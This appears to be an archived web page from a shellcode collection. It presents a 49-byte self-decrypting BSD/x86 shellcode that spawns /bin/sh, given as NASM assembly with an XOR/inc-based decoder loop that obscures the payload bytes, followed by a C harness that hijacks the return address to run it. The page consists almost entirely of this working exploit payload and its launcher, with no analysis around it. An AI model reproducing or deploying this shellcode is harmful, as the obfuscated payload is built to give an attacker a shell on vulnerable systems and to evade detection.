<html><head><title>BSD/x86 - execve /bin/sh Crypt /bin/sh - 49 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* Self decripting (dec/inc) shellcode executes /bin/sh
   Size  49 bytes
   OS	   *BSD
  		/rootteam/dev0id	(www.sysworld.net)
			dev0id@uncompiled.com 

BITS	32
jmp	short	shellcode
main:
	pop	esi
	xor	ecx,ecx
	mov	cl,28
main_decript:	
	inc byte [esi+ecx]
	loop	main_decript
	inc byte [esi]
	push	esi
	ret	


shellcode:
call	main

db 	0xea,0x0d,0x5d,0x30,0xbf,0x87,0x45,0x06,0x4f,0x53,0x55,0xaf,0x3a,0x4f,0xcc
db	0x7f,0xe7,0xec,0xfe,0xfe,0xfe,0x2e,0x61,0x68,0x6d,0x2e,0x72,0x67
*/

char shellcode[] =
	&quot;\xeb\x0e\x5e\x31\xc9\xb1\x1c\xfe\x04\x0e\xe2\xfb\xfe\x06\x56&quot;
	&quot;\xc3\xe8\xed\xff\xff\xff\xea\x0d\x5d\x30\xbf\x87\x45\x06\x4f&quot;
	&quot;\x53\x55\xaf\x3a\x4f\xcc\x7f\xe7\xec\xfe\xfe\xfe\x2e\x61\x68&quot;
	&quot;\x6d\x2e\x72\x67&quot;;

int
main(void)
{
	int *ret;
	ret = (int*)&amp;ret + 2;
	(*ret) = shellcode;
}



<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
